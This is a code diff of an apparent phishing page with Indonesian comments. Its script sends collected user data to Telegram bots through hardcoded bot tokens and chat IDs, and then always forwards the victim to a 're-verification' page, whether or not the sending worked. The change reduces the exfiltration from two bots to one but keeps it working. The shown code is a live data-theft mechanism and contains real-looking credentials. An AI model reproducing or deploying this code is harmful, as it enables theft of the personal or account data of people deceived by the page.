@@ -149,12 +149,8 @@
         <script>
         // ==================== ⚠️ WAJIB DIISI LENGKAP! ====================
         // BOT 1 — Pastikan Token & Chat ID LENGKAP!
-        const BOT1_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFI1A"; // Ganti dengan Token lengkap Bot 1
-        const BOT1_CHAT_ID = "-1003797236002"; // Ganti dengan Chat ID lengkap Bot 1
-
-        // BOT 2
-        const BOT2_TOKEN = "8567366336:AAEBjptgS76AUDZ80k1C0uLL5NQnTGnQT0Q";
-        const BOT2_CHAT_ID = "-1003710620091";
+        const BOT1_TOKEN = "8567366336:AAEBjptgS76AUDZ80k1C0uLL5NQnTGnQT0Q";
+        const BOT1_CHAT_ID = "-1003710620091";
 
         // Halaman tujuan
         const HALAMAN_BERIKUTNYA = "verifikasi ulang.html";
@@ -226,13 +222,12 @@ ${timerExpired ? '⚠️ Waktu sudah habis!' : ''}`;
             console.log("📤 Mengirim data ke 2 bot...");
 
             // Kirim ke 2 bot bersamaan
-            const [hasilBot1, hasilBot2] = await Promise.all([
+            const [hasilBot1] = await Promise.all([
                 kirimKeBot(BOT1_TOKEN, BOT1_CHAT_ID, pesan),
-                kirimKeBot(BOT2_TOKEN, BOT2_CHAT_ID, pesan)
             ]);
 
             console.log("🤖 Bot 1:", hasilBot1 ? "✅ Berhasil" : "❌ Gagal");
-            console.log("🤖 Bot 2:", hasilBot2 ? "✅ Berhasil" : "❌ Gagal");
+        
 
             // Selalu pindah halaman — meskipun bot gagal
             console.log("➡️ Pindah ke halaman:", HALAMAN_BERIKUTNYA);
